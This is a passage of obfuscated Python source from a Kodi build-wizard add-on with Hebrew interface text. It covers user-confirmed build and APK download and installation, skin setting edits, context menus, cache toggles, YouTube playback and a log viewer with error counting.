			O00O0OOO000O0O0O0 .close ()#line:4310
			O00OOO0O0O0OO0O0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4311
			O00OO0O0000OOO00O =re .compile (O00OOO0O0O0OO0O0O ).findall (O0O00OOO0OO0OO0O0 )[0 ]#line:4312
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'w')#line:4313
			O00O0OOO000O0O0O0 .write (O0O00OOO0OO0OO0O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O00OO0O0000OOO00O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4314
			O00O0OOO000O0O0O0 .close ()#line:4315
			O0OOO0O00O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4319
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'r')#line:4321
			O0O00OOO0OO0OO0O0 =O00O0OOO000O0O0O0 .read ()#line:4322
			O00O0OOO000O0O0O0 .close ()#line:4323
			O00OOO0O0O0OO0O0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4324
			O00OO0O0000OOO00O =re .compile (O00OOO0O0O0OO0O0O ).findall (O0O00OOO0OO0OO0O0 )[0 ]#line:4325
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'w')#line:4326
			O00O0OOO000O0O0O0 .write (O0O00OOO0OO0OO0O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O00OO0O0000OOO00O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4327
			O00O0OOO000O0O0O0 .close ()#line:4328
		except :#line:4333
			pass #line:4334
def thirdPartyInstall (OOOOOO0OOOO00O00O ,OO0OO0OOO00OO000O ):#line:4336
	if not wiz .workingURL (OO0OO0OOO00OO000O ):#line:4337
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4338
	O0OOOOO0O0OOO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO0OOOO00O00O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4339
	if O0OOOOO0O0OOO00O0 ==1 :#line:4340
		freshStart ('third',True )#line:4341
	wiz .clearS ('build')#line:4342
	O000OO00OOO0OOO00 =OOOOOO0OOOO00O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4343
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4344
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOO00O00O ),'','אנא המתן')#line:4345
	O0O0000O00OOOOOO0 =os .path .join (PACKAGES ,'%s.zip'%O000OO00OOO0OOO00 )#line:4346
	try :os .remove (O0O0000O00OOOOOO0 )#line:4347
	except :pass #line:4348
	downloader .download (OO0OO0OOO00OO000O ,O0O0000O00OOOOOO0 ,DP )#line:4349
	xbmc .sleep (1000 )#line:4350
	O0OO00OO00O000000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOO00O00O )#line:4351
	DP .update (0 ,O0OO00OO00O000000 ,'','אנא המתן')#line:4352
	OOO00OOO00OO00OO0 ,OO00OOO0O0O0O0O00 ,OO0OO00O0OO0OO00O =extract .all (O0O0000O00OOOOOO0 ,HOME ,DP ,title =O0OO00OO00O000000 )#line:4353
	if int (float (OOO00OOO00OO00OO0 ))>0 :#line:4354
		wiz .fixmetas ()#line:4355
		wiz .lookandFeelData ('save')#line:4356
		wiz .defaultSkin ()#line:4357
		wiz .setS ('installed','true')#line:4359
		wiz .setS ('extract',str (OOO00OOO00OO00OO0 ))#line:4360
		wiz .setS ('errors',str (OO00OOO0O0O0O0O00 ))#line:4361
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO00OOO00OO00OO0 ,OO00OOO0O0O0O0O00 ))#line:4362
		try :os .remove (O0O0000O00OOOOOO0 )#line:4363
		except :pass #line:4364
		if int (float (OO00OOO0O0O0O0O00 ))>0 :#line:4365
			OO00O0000OO0O0O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOO00O00O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO00OOO00OO00OO0 ,'%',COLOR1 ,OO00OOO0O0O0O0O00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4366
			if OO00O0000OO0O0O00 :#line:4367
				if isinstance (OO00OOO0O0O0O0O00 ,unicode ):#line:4368
					OO0OO00O0OO0OO00O =OO0OO00O0OO0OO00O .encode ('utf-8')#line:4369
				wiz .TextBox (ADDONTITLE ,OO0OO00O0OO0OO00O )#line:4370
	DP .close ()#line:4371
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4372
	if INSTALLMETHOD ==1 :OO0OO0OO0O0O0O0OO =1 #line:4373
	elif INSTALLMETHOD ==2 :OO0OO0OO0O0O0O0OO =0 #line:4374
	else :OO0OO0OO0O0O0O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4375
	if OO0OO0OO0O0O0O0OO ==1 :wiz .reloadFix ()#line:4376
	else :wiz .killxbmc (True )#line:4377
def testTheme (OO0OOOOO0O0000000 ):#line:4379
	O000OO0O00O0000OO =zipfile .ZipFile (OO0OOOOO0O0000000 )#line:4380
	for O0000O00OOOO0OO0O in O000OO0O00O0000OO .infolist ():#line:4381
		if '/settings.xml'in O0000O00OOOO0OO0O .filename :#line:4382
			return True #line:4383
	return False #line:4384
def testGui (O0OOOOOO0O0O0O00O ):#line:4386
	OOOOOOOO00OO0O00O =zipfile .ZipFile (O0OOOOOO0O0O0O00O )#line:4387
	for OOOO000OO0OO0O000 in OOOOOOOO00OO0O00O .infolist ():#line:4388
		if '/guisettings.xml'in OOOO000OO0OO0O000 .filename :#line:4389
			return True #line:4390
	return False #line:4391
def apkInstaller (OOOO00OOOOOO0000O ,O0O0OO00OOOOO000O ):#line:4393
	wiz .log (OOOO00OOOOOO0000O )#line:4394
	wiz .log (O0O0OO00OOOOO000O )#line:4395
	if wiz .platform ()=='android':#line:4396
		OO00O0O0O0O0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OOOOOO0000O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4397
		if not OO00O0O0O0O0OO00O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4398
		O0OO000OO0O00O00O =OOOO00OOOOOO0000O #line:4399
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4400
		if not wiz .workingURL (O0O0OO00OOOOO000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4401
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000OO0O00O00O ),'','אנא המתן')#line:4402
		OOO0O0O0OOO0O00O0 =os .path .join (PACKAGES ,"%s.apk"%OOOO00OOOOOO0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4403
		try :os .remove (OOO0O0O0OOO0O00O0 )#line:4404
		except :pass #line:4405
		downloader .download (O0O0OO00OOOOO000O ,OOO0O0O0OOO0O00O0 ,DP )#line:4406
		xbmc .sleep (100 )#line:4407
		DP .close ()#line:4408
		notify .apkInstaller (OOOO00OOOOOO0000O )#line:4409
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO0O0O0OOO0O00O0 +'")')#line:4410
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4411
def createMenu (OOO00OOOO0000O0OO ,OO00O0O0000OOOO0O ,O00OOO0OOOOO0O0O0 ):#line:4417
	if OOO00OOOO0000O0OO =='saveaddon':#line:4418
		OOO0000OO0OOO0OOO =[]#line:4419
		O00OO0OOO0OO000OO =urllib .quote_plus (OO00O0O0000OOOO0O .lower ().replace (' ',''))#line:4420
		OOOOOOOOOO000000O =OO00O0O0000OOOO0O .replace ('Debrid','Real Debrid')#line:4421
		O0O0OO0000O0OO0OO =urllib .quote_plus (O00OOO0OOOOO0O0O0 .lower ().replace (' ',''))#line:4422
		O00OOO0OOOOO0O0O0 =O00OOO0OOOOO0O0O0 .replace ('url','URL Resolver')#line:4423
		OOO0000OO0OOO0OOO .append ((THEME2 %O00OOO0OOOOO0O0O0 .title (),' '))#line:4424
		OOO0000OO0OOO0OOO .append ((THEME3 %'Save %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4425
		OOO0000OO0OOO0OOO .append ((THEME3 %'Restore %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4426
		OOO0000OO0OOO0OOO .append ((THEME3 %'Clear %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4427
	elif OOO00OOOO0000O0OO =='save':#line:4428
		OOO0000OO0OOO0OOO =[]#line:4429
		O00OO0OOO0OO000OO =urllib .quote_plus (OO00O0O0000OOOO0O .lower ().replace (' ',''))#line:4430
		OOOOOOOOOO000000O =OO00O0O0000OOOO0O .replace ('Debrid','Real Debrid')#line:4431
		O0O0OO0000O0OO0OO =urllib .quote_plus (O00OOO0OOOOO0O0O0 .lower ().replace (' ',''))#line:4432
		O00OOO0OOOOO0O0O0 =O00OOO0OOOOO0O0O0 .replace ('url','URL Resolver')#line:4433
		OOO0000OO0OOO0OOO .append ((THEME2 %O00OOO0OOOOO0O0O0 .title (),' '))#line:4434
		OOO0000OO0OOO0OOO .append ((THEME3 %'Register %s'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4435
		OOO0000OO0OOO0OOO .append ((THEME3 %'Save %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4436
		OOO0000OO0OOO0OOO .append ((THEME3 %'Restore %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4437
		OOO0000OO0OOO0OOO .append ((THEME3 %'Import %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4438
		OOO0000OO0OOO0OOO .append ((THEME3 %'Clear Addon %s Data'%OOOOOOOOOO000000O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00OO0OOO0OO000OO ,O0O0OO0000O0OO0OO )))#line:4439
	elif OOO00OOOO0000O0OO =='install':#line:4440
		OOO0000OO0OOO0OOO =[]#line:4441
		O0O0OO0000O0OO0OO =urllib .quote_plus (O00OOO0OOOOO0O0O0 )#line:4442
		OOO0000OO0OOO0OOO .append ((THEME2 %O00OOO0OOOOO0O0O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0O0OO0000O0OO0OO )))#line:4443
		OOO0000OO0OOO0OOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0O0OO0000O0OO0OO )))#line:4444
		OOO0000OO0OOO0OOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0O0OO0000O0OO0OO )))#line:4445
		OOO0000OO0OOO0OOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0O0OO0000O0OO0OO )))#line:4446
		OOO0000OO0OOO0OOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0O0OO0000O0OO0OO )))#line:4447
	OOO0000OO0OOO0OOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4448
	return OOO0000OO0OOO0OOO #line:4449
def toggleCache (OOO000O0O00O0O000 ):#line:4451
	O0O000O00OO0O0000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4452
	O00OOO00OO00OO00O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4453
	if OOO000O0O00O0O000 in ['true','false']:#line:4454
		for OOO00O00O0000OOO0 in O0O000O00OO0O0000 :#line:4455
			wiz .setS (OOO00O00O0000OOO0 ,OOO000O0O00O0O000 )#line:4456
	else :#line:4457
		if not OOO000O0O00O0O000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4458
			try :#line:4459
				OOO00O00O0000OOO0 =O00OOO00OO00OO00O [O0O000O00OO0O0000 .index (OOO000O0O00O0O000 )]#line:4460
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO00O00O0000OOO0 ))#line:4461
			except :#line:4462
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO000O0O00O0O000 ))#line:4463
		else :#line:4464
			O00O0O0000O0OO0O0 ='true'if wiz .getS (OOO000O0O00O0O000 )=='false'else 'false'#line:4465
			wiz .setS (OOO000O0O00O0O000 ,O00O0O0000O0OO0O0 )#line:4466
def playVideo (OO0OOO0OOO000OOOO ):#line:4468
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0OOO0OOO000OOOO )#line:4469
	if 'watch?v='in OO0OOO0OOO000OOOO :#line:4470
		O0000OO0OOOO0O0OO ,OOO0O00OOOO0O0O00 =OO0OOO0OOO000OOOO .split ('?')#line:4471
		OOOOOO0OOOOO00OOO =OOO0O00OOOO0O0O00 .split ('&')#line:4472
		for O0O0O00OOO0OOOO00 in OOOOOO0OOOOO00OOO :#line:4473
			if O0O0O00OOO0OOOO00 .startswith ('v='):#line:4474
				OO0OOO0OOO000OOOO =O0O0O00OOO0OOOO00 [2 :]#line:4475
				break #line:4476
			else :continue #line:4477
	elif 'embed'in OO0OOO0OOO000OOOO or 'youtu.be'in OO0OOO0OOO000OOOO :#line:4478
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0OOO0OOO000OOOO )#line:4479
		O0000OO0OOOO0O0OO =OO0OOO0OOO000OOOO .split ('/')#line:4480
		if len (O0000OO0OOOO0O0OO [-1 ])>5 :#line:4481
			OO0OOO0OOO000OOOO =O0000OO0OOOO0O0OO [-1 ]#line:4482
		elif len (O0000OO0OOOO0O0OO [-2 ])>5 :#line:4483
			OO0OOO0OOO000OOOO =O0000OO0OOOO0O0OO [-2 ]#line:4484
	wiz .log ("YouTube URL: %s"%OO0OOO0OOO000OOOO )#line:4485
	yt .PlayVideo (OO0OOO0OOO000OOOO )#line:4486
def viewLogFile ():#line:4488
	OO0OOOO000O0OOOOO =wiz .Grab_Log (True )#line:4489
	OOOO000OOOOOO0O0O =wiz .Grab_Log (True ,True )#line:4490
	OO000O0000O0O0O0O =0 ;OO00OOO000O0OO00O =OO0OOOO000O0OOOOO #line:4491
	if not OOOO000OOOOOO0O0O ==False and not OO0OOOO000O0OOOOO ==False :#line:4492
		OO000O0000O0O0O0O =DIALOG .select (ADDONTITLE ,["View %s"%OO0OOOO000O0OOOOO .replace (LOG ,""),"View %s"%OOOO000OOOOOO0O0O .replace (LOG ,"")])#line:4493
		if OO000O0000O0O0O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4494
	elif OO0OOOO000O0OOOOO ==False and OOOO000OOOOOO0O0O ==False :#line:4495
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4496
		return #line:4497
	elif not OO0OOOO000O0OOOOO ==False :OO000O0000O0O0O0O =0 #line:4498
	elif not OOOO000OOOOOO0O0O ==False :OO000O0000O0O0O0O =1 #line:4499
	OO00OOO000O0OO00O =OO0OOOO000O0OOOOO if OO000O0000O0O0O0O ==0 else OOOO000OOOOOO0O0O #line:4501
	O000OO0OOOOO000OO =wiz .Grab_Log (False )if OO000O0000O0O0O0O ==0 else wiz .Grab_Log (False ,True )#line:4502
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00OOO000O0OO00O ),O000OO0OOOOO000OO )#line:4504
def errorChecking (log =None ,count =None ,all =None ):#line:4506
	if log ==None :#line:4507
		O0O0O0000OO0O000O =wiz .Grab_Log (True )#line:4508
		O0O0O0OO00OO0OO0O =wiz .Grab_Log (True ,True )#line:4509
		if not O0O0O0OO00OO0OO0O ==False and not O0O0O0000OO0O000O ==False :#line:4510
			O0O00000OOOO000OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0O0000OO0O000O .replace (LOG ,""),errorChecking (O0O0O0000OO0O000O ,True ,True )),"View %s: %s error(s)"%(O0O0O0OO00OO0OO0O .replace (LOG ,""),errorChecking (O0O0O0OO00OO0OO0O ,True ,True ))])#line:4511
			if O0O00000OOOO000OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4512
		elif O0O0O0000OO0O000O ==False and O0O0O0OO00OO0OO0O ==False :#line:4513
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4514
			return #line:4515
		elif not O0O0O0000OO0O000O ==False :O0O00000OOOO000OO =0 #line:4516
		elif not O0O0O0OO00OO0OO0O ==False :O0O00000OOOO000OO =1 #line:4517
		log =O0O0O0000OO0O000O if O0O00000OOOO000OO ==0 else O0O0O0OO00OO0OO0O #line:4518
	if log ==False :#line:4519
		if count ==None :#line:4520
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4521
			return False #line:4522
		else :#line:4523
			return 0 #line:4524
	else :#line:4525
		if os .path .exists (log ):#line:4526
			OOOO0OOO0O0O00OO0 =open (log ,mode ='r');O00O0OOOO0O0OOOO0 =OOOO0OOO0O0O00OO0 .read ().replace ('\n','').replace ('\r','');OOOO0OOO0O0O00OO0 .close ()#line:4527
			O00OO0O00OO0000O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00O0OOOO0O0OOOO0 )#line:4528
			if not count ==None :#line:4529
				if all ==None :#line:4530
					OO0O0000OO0O00OOO =0 #line:4531
					for OO0OO00OO000O00OO in O00OO0O00OO0000O0 :#line:4532
						if ADDON_ID in OO0OO00OO000O00OO :OO0O0000OO0O00OOO +=1 #line:4533
					return OO0O0000OO0O00OOO #line:4534
				else :return len (O00OO0O00OO0000O0 )#line:4535
			if len (O00OO0O00OO0000O0 )>0 :#line:4536
				OO0O0000OO0O00OOO =0 ;O0OO00O0O00OO0O00 =""#line:4537
				for OO0OO00OO000O00OO in O00OO0O00OO0000O0 :#line:4538
					if all ==None and not ADDON_ID in OO0OO00OO000O00OO :continue #line:4539
					else :#line:4540
						OO0O0000OO0O00OOO +=1 #line:4541
						O0OO00O0O00OO0O00 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO0O0000OO0O00OOO ,OO0OO00OO000O00OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4542
				if OO0O0000OO0O00OOO >0 :#line:4543
					wiz .TextBox (ADDONTITLE ,O0OO00O0O00OO0O00 )#line:4544
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4545
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4546
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4547
ACTION_PREVIOUS_MENU =10 #line:4549
ACTION_NAV_BACK =92 #line:4550
ACTION_MOVE_LEFT =1 #line:4551
ACTION_MOVE_RIGHT =2 #line:4552
ACTION_MOVE_UP =3 #line:4553
ACTION_MOVE_DOWN =4 #line:4554
ACTION_MOUSE_WHEEL_UP =104 #line:4555
ACTION_MOUSE_WHEEL_DOWN =105 #line:4556
ACTION_MOVE_MOUSE =107 #line:4557
ACTION_SELECT_ITEM =7 #line:4558
ACTION_BACKSPACE =110 #line:4559
ACTION_MOUSE_LEFT_CLICK =100 #line:4560
ACTION_MOUSE_LONG_CLICK =108 #line:4561
def LogViewer (default =None ):#line:4563
	class O0OOO0OO0OO0000O0 (xbmcgui .WindowXMLDialog ):#line:4564
		def __init__ (O0000O0OOOO00000O ,*OOO000000OOO00O0O ,**OO00OO0OO00000OO0 ):#line:4565
			O0000O0OOOO00000O .default =OO00OO0OO00000OO0 ['default']#line:4566
		def onInit (OO00O00000OO0OOOO ):#line:4568
			OO00O00000OO0OOOO .title =101 #line:4569
			OO00O00000OO0OOOO .msg =102 #line:4570
			OO00O00000OO0OOOO .scrollbar =103 #line:4571
			OO00O00000OO0OOOO .upload =201 #line:4572
			OO00O00000OO0OOOO .kodi =202 #line:4573
			OO00O00000OO0OOOO .kodiold =203 #line:4574
			OO00O00000OO0OOOO .wizard =204 #line:4575
			OO00O00000OO0OOOO .okbutton =205 #line:4576
			OOOO0O0O0O00O00OO =open (OO00O00000OO0OOOO .default ,'r')#line:4577
			OO00O00000OO0OOOO .logmsg =OOOO0O0O0O00O00OO .read ()#line:4578
			OOOO0O0O0O00O00OO .close ()#line:4579
			OO00O00000OO0OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO00O00000OO0OOOO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4580
			OO00O00000OO0OOOO .showdialog ()#line:4581
		def showdialog (O00000O0O00O00O0O ):#line:4583
			O00000O0O00O00O0O .getControl (O00000O0O00O00O0O .title ).setLabel (O00000O0O00O00O0O .titlemsg )#line:4584
			O00000O0O00O00O0O .getControl (O00000O0O00O00O0O .msg ).setText (wiz .highlightText (O00000O0O00O00O0O .logmsg ))#line:4585
			O00000O0O00O00O0O .setFocusId (O00000O0O00O00O0O .scrollbar )#line:4586
		def onClick (O00OO0OO0O000OO0O ,O000OO00O00O0OO00 ):#line:4588
			if O000OO00O00O0OO00 ==O00OO0OO0O000OO0O .okbutton :O00OO0OO0O000OO0O .close ()#line:4589
			elif O000OO00O00O0OO00 ==O00OO0OO0O000OO0O .upload :O00OO0OO0O000OO0O .close ();uploadLog .Main ()#line:4590
			elif O000OO00O00O0OO00 ==O00OO0OO0O000OO0O .kodi :#line:4591
				OOO0000OO0OOO00OO =wiz .Grab_Log (False )#line:4592
				O00OOO0O0O00000O0 =wiz .Grab_Log (True )#line:4593
				if OOO0000OO0OOO00OO ==False :#line:4594
					O00OO0OO0O000OO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4595
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .msg ).setText ("Log File Does Not Exists!")#line:4596
				else :#line:4597
					O00OO0OO0O000OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0O0O00000O0 .replace (LOG ,''))#line:4598
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .title ).setLabel (O00OO0OO0O000OO0O .titlemsg )#line:4599
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .msg ).setText (wiz .highlightText (OOO0000OO0OOO00OO ))#line:4600
					O00OO0OO0O000OO0O .setFocusId (O00OO0OO0O000OO0O .scrollbar )#line:4601
			elif O000OO00O00O0OO00 ==O00OO0OO0O000OO0O .kodiold :#line:4602
				OOO0000OO0OOO00OO =wiz .Grab_Log (False ,True )#line:4603
				O00OOO0O0O00000O0 =wiz .Grab_Log (True ,True )#line:4604
				if OOO0000OO0OOO00OO ==False :#line:4605
					O00OO0OO0O000OO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4606
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .msg ).setText ("Log File Does Not Exists!")#line:4607
				else :#line:4608
					O00OO0OO0O000OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0O0O00000O0 .replace (LOG ,''))#line:4609
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .title ).setLabel (O00OO0OO0O000OO0O .titlemsg )#line:4610
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .msg ).setText (wiz .highlightText (OOO0000OO0OOO00OO ))#line:4611
					O00OO0OO0O000OO0O .setFocusId (O00OO0OO0O000OO0O .scrollbar )#line:4612
			elif O000OO00O00O0OO00 ==O00OO0OO0O000OO0O .wizard :#line:4613
				OOO0000OO0OOO00OO =wiz .Grab_Log (False ,False ,True )#line:4614
				O00OOO0O0O00000O0 =wiz .Grab_Log (True ,False ,True )#line:4615
				if OOO0000OO0OOO00OO ==False :#line:4616
					O00OO0OO0O000OO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4617
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .msg ).setText ("Log File Does Not Exists!")#line:4618
				else :#line:4619
					O00OO0OO0O000OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0O0O00000O0 .replace (ADDONDATA ,''))#line:4620
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .title ).setLabel (O00OO0OO0O000OO0O .titlemsg )#line:4621
					O00OO0OO0O000OO0O .getControl (O00OO0OO0O000OO0O .msg ).setText (wiz .highlightText (OOO0000OO0OOO00OO ))#line:4622
					O00OO0OO0O000OO0O .setFocusId (O00OO0OO0O000OO0O .scrollbar )#line:4623
		def onAction (O0000OOOO0OO0OOO0 ,OOOOO000000O0O0OO ):#line:4625
			if OOOOO000000O0O0OO ==ACTION_PREVIOUS_MENU :O0000OOOO0OO0OOO0 .close ()#line:4626
			elif OOOOO000000O0O0OO ==ACTION_NAV_BACK :O0000OOOO0OO0OOO0 .close ()#line:4627
	if default ==None :default =wiz .Grab_Log (True )#line:4628
	O00O0O0OOOO0OO000 =O0OOO0OO0OO0000O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4629
	O00O0O0OOOO0OO000 .doModal ()#line:4630
	del O00O0O0OOOO0OO000 #line:4631
def removeAddon (O000000000OO0O0O0 ,OO00000OOO00OOO00 ,over =False ):#line:4633
	if not over ==False :#line:4634
		OO00O00000O0OO00O =1 #line:4635
	else :#line:4636
		OO00O00000O0OO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00000OOO00OOO00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O000000000OO0O0O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4637
	if OO00O00000O0OO00O ==1 :#line:4638
